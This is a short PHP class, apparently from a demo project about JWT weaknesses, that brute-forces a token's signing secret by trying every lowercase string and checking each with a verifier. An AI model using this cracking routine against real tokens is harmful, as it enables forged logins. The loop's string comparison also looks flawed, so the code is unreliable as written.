<?php

namespace App\Attack;

use App\JWT;
use App\Verifier;

class BruteForce
{
    public static function attack(JWT $jwt): string
    {
        for ($secret = 'a'; $secret <= 'zzzzzz'; $secret++) {
            if (Verifier::verify($jwt, $secret)) {
                return $secret;
            }
        }

        throw new \Exception('Secret not found');
    }
}